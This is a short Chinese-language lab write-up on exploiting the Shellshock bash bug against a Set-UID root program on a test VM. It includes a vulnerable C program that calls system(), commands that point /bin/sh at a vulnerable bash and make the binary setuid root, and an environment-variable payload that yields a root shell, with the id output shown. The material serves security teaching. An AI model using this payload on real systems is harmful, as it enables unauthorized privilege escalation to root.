#
#### 利用shellshock攻击Set-UID程序
当特权程序通过system()函数执行/bin/ls时，将会启动一个bash进程，攻击者设置的环境变量会导致非授权的命令以root权限执行。
```
// vul.c
# include <unistd.h>
# include <stdio.h>
# include <stdlib.h>

void main()
{
    setuid(geteuid());
    system("/bin/ls -l");
}
```
system()使用fork()函数创建子进程，然后使用execl()函数执行/bin/sh程序。**最终请求shell程序**执行/bin/ls。  
/bin/sh指向的时/bin/dash，dash是没有漏洞。为了实验成功。把/bin/sh指向前面安装的bash_shellshock  
```
ubuntu@VM-0-17-ubuntu:~$ sudo ln -sf /bin/bash_shellshock /bin/sh
ubuntu@VM-0-17-ubuntu:~$ gcc -o vul vul.c
ubuntu@VM-0-17-ubuntu:~$ sudo chown root vul
ubuntu@VM-0-17-ubuntu:~$ sudo chmod 4655 vul
ubuntu@VM-0-17-ubuntu:~$ echo $foo

ubuntu@VM-0-17-ubuntu:~$ export foo='() { echo hello shan;}; /bin/sh'
ubuntu@VM-0-17-ubuntu:~$ ./vul 
sh-4.2# id
uid=0(root) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)  
sh-4.2# 

```
uid为0，成功拥有root权限


